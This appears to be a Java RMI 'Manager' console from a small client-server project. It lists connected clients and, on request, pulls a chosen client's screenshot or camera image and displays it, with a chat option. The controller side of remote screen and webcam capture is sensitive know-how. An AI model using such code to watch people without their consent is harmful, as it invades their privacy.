import core.service.ChatUtils;
import core.service.MessageModel;
import core.service.MyRemoteInterface;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.*;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.util.List;
import java.util.Scanner;

public class Manager {
    static  MyRemoteInterface server ;
    static final ChatUtils chatUtils = new ChatUtils("Manager");
    public static void main(String[] args) {
        try {
            server = (MyRemoteInterface) Naming.lookup("//localhost/MyRemoteServer");
            chatUtils.initial();
            while (true){
                showOption();
                try{
                    Scanner s = new Scanner(System.in);
                    int choice = s.nextInt();
                    if(choice == 0){
                        break;
                    }
                    handleChoice(choice);
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static void showOption(){
        System.out.println(
                "1- get client screenshot \n" +
                "2- get client camera image\n" +
                "3- chat with Client\n" +
                "0- end connection with server\n"
        );
    }
    private static void handleChoice(int choice) throws IOException {
        if (choice == 1) {
            choiceOneHandle();
        }else if(choice == 2){
            choiceTwoHandle();
        }else if(choice == 3){
            choiceThreeHandle();
        }
    }
    private static void choiceOneHandle() throws IOException {
        final  byte[] image = server.getScreenshot(showUsersIdsAndGetManagerInput());
        ByteArrayInputStream bais = new ByteArrayInputStream(image);
        BufferedImage bufferedImage = ImageIO.read(bais);
        showImage(bufferedImage);
    }
    private static void choiceThreeHandle() throws IOException {
        sendMessage();
    }
    private static void sendMessage() throws IOException {
        chatUtils.sendMessage();
    }
    private static void choiceTwoHandle() throws IOException {
        final  byte[] image = server.getCameraImage(showUsersIdsAndGetManagerInput());
        ByteArrayInputStream bais = new ByteArrayInputStream(image);
        BufferedImage bufferedImage = ImageIO.read(bais);
        showImage(bufferedImage);
    }
    private static String showUsersIdsAndGetManagerInput() throws RemoteException {
        final List<String> ids = server.getClientIds();
        for (int i = 0; i < ids.size(); i++) {
            System.out.println((i+1)+" -" + ids.get(i));
        }
        System.out.println("enter client id");
        Scanner s = new Scanner(System.in);
        int choice = s.nextInt();
        return ids.get(choice-1);
    }
    private static void showImage(BufferedImage image){
        JFrame frame = new JFrame("Image Display");
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                frame.setVisible(false);
            }
        });
        JLabel label = new JLabel(new ImageIcon(image));
        frame.getContentPane().add(label, BorderLayout.CENTER);
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }
}

